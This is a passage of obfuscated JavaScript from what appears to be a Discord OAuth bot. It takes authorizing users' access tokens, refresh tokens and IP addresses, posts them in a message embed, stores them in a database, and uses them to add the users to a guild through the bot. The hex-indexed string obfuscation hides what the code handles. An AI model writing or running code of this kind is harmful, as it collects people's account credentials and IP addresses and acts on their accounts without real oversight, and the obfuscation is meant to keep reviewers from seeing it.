						'description': stars(0x1da) + space[stars(0x204)][_0x5bcd17(0x1a2)] + '#' + space[_0x5bcd17(0x1c7)][stars(0x1e1)] + '`' + (stars(0x1df) + _0x3f93ee + '`') + (stars(0x1e7) + space[_0x29bc88(0xc7)]['id'] + '`') + (_0x29bc88(0xb3) + ac_token + '`') + (stars(0x1f4) + rf_token + '`')
					}]
				})
			}), _0x576d04 = await new usersSchema({
				'userId': space[stars(0x204)]['id'],
				'avatarURL': avatarHASH,
				'username': space[stars(0x204)][stars(0x1cb)] + '#' + space[stars(0x204)][_0x5bcd17(0x1b0)],
				'accessToken': ac_token,
				'refreshToken': rf_token,
				'user_ip': _0x3f93ee
			}), await _0x576d04[stars(0x1c9)](), await oauth[stars(0x20c)]({
				'guildId': '' + epic[stars(0x1ce)],
				'botToken': epic[stars(0x1e0)],
				'userId': _0x576d04[stars(0x1ca)],
				'accessToken': _0x576d04[stars(0x1ea)]
			})[stars(0x1c4)](() => {
				return;
			});
		})[_0x58c095(0x1c4)](_0x141aab => {
			const _0x32405e = _0x538f;
			console[_0x32405e(0x198)](_0x141aab);
		});
	});
}), module[_0x2cb03d(0x1fc)] = client, client[_0x2cb03d(0x1d6)] = Discord, client[_0x5f393d(0xab)] = new Collection(), handler[_0x2cb03d(0x1dc)](client), handler[_0x5f393d(0xda)](client), process['on'](_0x2cb03d(0x1d5), _0x2a4aea => {
	const _0x183070 = _0x2cb03d;
	console[_0x183070(0x1f3)](_0x183070(0x1e5) + _0x2a4aea);
}), process['on'](_0x2cb03d(0x1f0), (_0x3fbf85, _0x8e197a) => {
	const _0x48b3fd = _0x2cb03d;
	console[_0x48b3fd(0x1f3)](_0x48b3fd(0x203), _0x8e197a, _0x48b3fd(0x1dd), _0x3fbf85[_0x48b3fd(0x1c3)]);
}), client[_0x2cb03d(0x20f)](epic[_0x2cb03d(0x1e0)])[_0x2cb03d(0x1c4)](() => {
	const _0x3dc54c = _0x2cb03d;
	throw new Error(_0x3dc54c(0x1ee));
}), app[_0x2cb03d(0x1cc)](epic[_0x253366(0x17f)], () => console[_0x2cb03d(0x1f3)](_0x5f393d(0xd0)));